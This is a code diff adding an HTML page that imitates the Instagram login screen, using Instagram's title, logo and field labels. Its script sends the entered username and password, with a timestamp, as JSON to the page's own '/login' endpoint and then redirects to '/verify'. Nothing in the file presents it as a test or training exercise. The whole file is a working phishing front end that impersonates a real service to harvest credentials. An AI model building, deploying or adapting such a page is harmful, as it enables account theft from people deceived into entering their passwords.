@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log into Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #161f23;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    .login-container {
+      width: 100%;
+      max-width: 580px;
+      padding: 0 24px;
+    }
+    h1 {
+      color: #e8e8e8;
+      font-size: 18px;
+      font-weight: 400;
+      margin-bottom: 24px;
+      letter-spacing: 0px;
+    }
+    .input-wrapper {
+      position: relative;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .input-wrapper label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 15px;
+      font-weight: 400;
+      color: #8e8e8e;
+      pointer-events: none;
+      transition: top 0.15s ease, font-size 0.15s ease, transform 0.15s ease;
+    }
+    .input-wrapper input {
+      width: 100%;
+      background-color: #161f23;
+      border: 1px solid #2e3d50;
+      border-radius: 12px;
+      padding: 0 16px;
+      color: #ffffff;
+      font-size: 15px;
+      font-family: inherit;
+      outline: none;
+      display: block;
+      height: 58px;
+      transition: border-color 0.2s, padding 0.15s ease;
+    }
+    .input-wrapper input:focus,
+    .input-wrapper input:not(:placeholder-shown) {
+      padding: 18px 16px 6px 16px;
+      border-color: #4a5e72;
+    }
+    .input-wrapper input:focus + label,
+    .input-wrapper input:not(:placeholder-shown) + label {
+      top: 10px;
+      transform: translateY(0);
+      font-size: 11px;
+      color: #8e8e8e;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #3457a8;
+      color: #a8b8d0;
+      border: none;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: not-allowed;
+      margin-top: 6px;
+      margin-bottom: 22px;
+      letter-spacing: 0.2px;
+      transition: background-color 0.3s, color 0.3s;
+      opacity: 0.4;
+    }
+    .login-btn.active {
+      background-color: #3457a8;
+      color: #a8b8d0;
+      cursor: pointer;
+      opacity: 1;
+    }
+    .login-btn.active:hover {
+      background-color: #3d62be;
+    }
+    .forgot-password {
+      text-align: center;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      text-decoration: none;
+      display: block;
+    }
+    .forgot-password:hover {
+      color: #cccccc;
+    }
+    .logo-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 32px;
+      margin-top: -100px;
+    }
+    .ig-logo {
+      width: 80px;
+      height: 80px;
+    }
+    .message {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #5cb85c;
+      display: none;
+    }
+    .message.error {
+      color: #e05555;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo-wrapper">
+      <img src="instagram_logo.png" class="ig-logo" alt="Instagram" />
+    </div>
+    <h1>Log into Instagram</h1>
+    <div class="input-wrapper">
+      <input type="text" id="username" placeholder=" " />
+      <label for="username">Mobile number, username or email</label>
+    </div>
+    <div class="input-wrapper">
+      <input type="password" id="password" placeholder=" " />
+      <label for="password">Password</label>
+    </div>
+    <button class="login-btn" id="loginBtn" disabled>Log in</button>
+    <div class="message" id="message"></div>
+    <a href="#" class="forgot-password">Forgot password?</a>
+  </div>
+
+  <script>
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const message = document.getElementById('message');
+
+    function checkInputs() {
+      if (usernameInput.value.trim() !== '' || passwordInput.value.trim() !== '') {
+        loginBtn.classList.add('active');
+        loginBtn.disabled = false;
+      } else {
+        loginBtn.classList.remove('active');
+        loginBtn.disabled = true;
+      }
+    }
+
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+
+    loginBtn.addEventListener('click', async () => {
+      if (loginBtn.disabled) return;
+
+      const payload = {
+        username: usernameInput.value.trim(),
+        password: passwordInput.value.trim(),
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        const res = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        window.location.href = '/verify';
+      } catch (err) {
+        message.textContent = '✗ Could not connect to server.';
+        message.className = 'message error';
+        message.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
